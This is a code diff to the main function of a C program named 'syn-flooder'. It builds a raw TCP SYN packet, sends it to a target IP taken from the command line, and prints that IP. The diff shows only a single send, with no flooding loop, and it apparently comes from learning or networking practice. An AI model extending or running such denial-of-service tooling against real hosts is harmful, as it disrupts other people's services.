@@ -47,13 +47,15 @@ short compute_tcp_checksum(char *buffer);
 
 int main(int argc, char *argv[]) {
   int raw_socket; // raw IP socket
+  int i, yes = 1;
   char packet[100];
   struct sockaddr_in *address;
   socklen_t addrlen;
-
-  if (argc != 3) {
+  unsigned char *ip_addr_part;
+  
+  if (argc != 2) {
     printf("Usage:\n");
-    printf("./syn-flooder <target-ip> <sender-ip>\n");
+    printf("./syn-flooder <target-ip>\n");
     exit(1);
   }
 
@@ -70,15 +72,27 @@ int main(int argc, char *argv[]) {
   }
 
   build_tcp_syn(packet);
-
-  address->sin_family = AF_INET;
-  address->sin_port = IPPROTO_TCP;
-  (address->sin_addr).s_addr = inet_aton(argv[1]);
+  // decode_tcp(packet);
   
+  address->sin_family = AF_INET;
+  address->sin_port = 0;
+  inet_aton(argv[1], &(address->sin_addr));
+
   if ((sendto(raw_socket, packet, sizeof(struct tcp_hdr), 0, (struct sockaddr *)address, addrlen)) == -1) {
     printf("Error sending data: %s\n", strerror(errno));
     exit(1);
   }
+
+  printf("Sending TCP SYN to IP ");
+  ip_addr_part = (unsigned char *)(&(address->sin_addr).s_addr);
+  for(i = 0; i < 4; i++) {
+    if (i > 0) {
+      printf(".");
+    }    
+    printf("%hhu", *ip_addr_part);
+    ip_addr_part++;
+  }
+  printf("\n");
 
 }
 
